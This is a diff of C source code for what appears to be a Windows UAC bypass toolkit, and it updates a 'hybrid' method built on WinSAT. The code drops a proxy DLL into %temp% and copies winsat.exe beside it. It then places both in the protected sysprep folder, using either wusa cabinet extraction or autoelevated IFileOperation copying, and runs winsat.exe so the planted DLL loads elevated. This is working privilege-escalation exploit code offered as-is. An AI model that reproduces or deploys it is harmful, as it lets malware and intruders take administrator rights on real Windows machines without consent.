@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     1.70
+*  VERSION:     1.8
 *
-*  DATE:        24 Apr 2015
+*  DATE:        11 Jul 2015
 *
 *  Hybrid UAC bypass methods.
 *
@@ -25,6 +25,7 @@
 #define T_AVRF_CMDLINE				L"/c wusa %ws /extract:%%windir%%\\system32"
 #define T_WINSATSRC					L"%temp%\\winsat.exe"
 #define T_WINSAT_CMDLINE			L"/c wusa %ws /extract:%%windir%%\\system32\\sysprep"
+#define T_WINSAT_TARGET             L"%systemroot%\\system32\\sysprep\\winsat.exe"
 
 /*
 * ucmAvrfMethod
@@ -137,7 +138,7 @@ BOOL ucmAvrfMethod(
 *
 * Purpose:
 *
-* Acquire elevation through abusing APPINFO.DLL whitelisting model logic and wusa installer autoelevation.
+* Acquire elevation through abusing APPINFO.DLL whitelisting model logic and wusa installer/IFileOperation autoelevation.
 * Slightly modified target and proxydll can work almost with every autoelevated/whitelisted application.
 * This method uses advantage of wusa to write to the protected folders, but can be adapted to IFileOperation too.
 * WinSAT used for demonstration purposes only.
@@ -146,7 +147,8 @@ BOOL ucmAvrfMethod(
 BOOL ucmWinSATMethod(
 	LPWSTR lpTargetDll,
 	PVOID ProxyDll,
-	DWORD ProxyDllSize
+	DWORD ProxyDllSize,
+	BOOL UseWusa
 	)
 {
 	BOOL bResult = FALSE, cond = FALSE;
@@ -174,7 +176,7 @@ BOOL ucmWinSATMethod(
 	do {
 
 		if (ExpandEnvironmentStrings(L"%systemroot%\\system32\\winsat.exe",
-			szSource, MAX_PATH) == 0) 
+			szSource, MAX_PATH) == 0)
 		{
 			break;
 		}
@@ -185,76 +187,112 @@ BOOL ucmWinSATMethod(
 			break;
 		}
 
-		// Copy winsat to temp directory.
-		if (!CopyFile(szSource,	szDest, FALSE)) {
+		// Copy winsat to temp directory
+		if (!CopyFile(szSource, szDest, FALSE)) {
 			break;
 		}
 
-		//build cabinet
+		//put target dll
 		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-		if (ExpandEnvironmentStringsW(T_MSUPACKAGE_NAME,
-			szBuffer, MAX_PATH) == 0)
-		{
+		_strcpy_w(szBuffer, L"%temp%\\");
+		_strcat_w(szBuffer, lpTargetDll);
+
+
+		//expand string for proxy dll
+		RtlSecureZeroMemory(szSource, sizeof(szSource));
+		if (ExpandEnvironmentStrings(szBuffer, szSource, MAX_PATH) == 0) {
 			break;
-		}	
+		}
 
-		Cabinet = cabCreate(szBuffer);
-		if (Cabinet) {
-			//put target dll
+		//write proxy dll to disk
+		if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
+			OutputDebugString(TEXT("[UCM] Failed to drop dll"));
+			break;
+		}
+		else {
+			OutputDebugStringW(TEXT("[UCM] Dll dropped successfully"));
+		}
+
+		//
+		// Two options: use wusa installer or IFileOperation
+		//
+		if ( UseWusa ) {
+
+			//build cabinet
 			RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-			_strcpy_w(szBuffer, L"%temp%\\");
-			_strcat_w(szBuffer, lpTargetDll);
-
-			//expand string for proxy dll
-			RtlSecureZeroMemory(szSource, sizeof(szSource));
-			if (ExpandEnvironmentStrings(szBuffer, szSource, MAX_PATH) == 0) {
-				break;
-			}
-
-			//expand string for winsat.exe
-			if (ExpandEnvironmentStrings(L"%temp%\\winsat.exe",
-				szDest, MAX_PATH) == 0)
+			if (ExpandEnvironmentStringsW(T_MSUPACKAGE_NAME,
+				szBuffer, MAX_PATH) == 0)
 			{
 				break;
 			}
 
-			//write proxy dll to disk
-			if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
-				OutputDebugString(TEXT("[UCM] Failed to drop dll"));
+			Cabinet = cabCreate(szBuffer);
+			if (Cabinet) {
+
+				//expand string for winsat.exe
+				if (ExpandEnvironmentStrings(L"%temp%\\winsat.exe",
+					szDest, MAX_PATH) == 0)
+				{
+					break;
+				}
+
+				//put proxy dll inside cabinet
+				cabAddFile(Cabinet, szSource, lpTargetDll);
+
+				//put winsat.exe
+				cabAddFile(Cabinet, szDest, L"winsat.exe");
+				cabClose(Cabinet);
+				Cabinet = NULL;
+			}
+			else {
+				OutputDebugString(TEXT("[UCM] Error creating cab archive"));
 				break;
 			}
 
-			//put proxy dll inside cabinet
-			cabAddFile(Cabinet, szSource, lpTargetDll);
-			
-			//put winsat.exe
-			cabAddFile(Cabinet, szDest, L"winsat.exe");
-			cabClose(Cabinet);
-			Cabinet = NULL;
+			//extract package
+			ucmWusaExtractPackage(T_WINSAT_CMDLINE);
+
+			RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+			if (ExpandEnvironmentStrings(T_WINSAT_TARGET, szBuffer, MAX_PATH) == 0)	{
+				break;
+			}
+			bResult = supRunProcess(szBuffer, NULL);
 		}
 		else {
-			OutputDebugString(TEXT("[UCM] Error creating cab archive"));
-			break;
+
+			//wusa extract banned, switch to IFileOperation.
+			RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+			if (ExpandEnvironmentStringsW(M1W7_TARGETDIR, 
+				szBuffer, MAX_PATH) == 0)
+			{
+				break;
+			}
+			bResult = ucmAutoElevateCopyFile(szSource, szBuffer);
+			if (!bResult) {
+				break;
+			}
+			bResult = ucmAutoElevateCopyFile(szDest, szBuffer);
+			if (!bResult) {
+				break;
+			}
+			
+			Sleep(0);
+
+			//run winsat
+			RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+			if (ExpandEnvironmentStrings(T_WINSAT_TARGET, szBuffer, MAX_PATH) == 0)	{
+				break;
+			}
+			bResult = supRunProcess(szBuffer, NULL);
+			//cleanup of the above files must be done by payload code
 		}
-
-		//extract package
-		ucmWusaExtractPackage(T_WINSAT_CMDLINE);
-
-		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-		if (ExpandEnvironmentStrings(L"%systemroot%\\system32\\sysprep\\winsat.exe",
-			szBuffer, MAX_PATH) == 0)
-		{
-			break;
-		}
-		bResult = supRunProcess(szBuffer, NULL);
-
 
 	} while (cond);
 
 	if (Cabinet) {
 		cabClose(Cabinet);
 	}
-	//remove trash
+	//remove trash from %temp%
 	if (szDest[0] != 0) {
 		DeleteFileW(szDest);
 	}
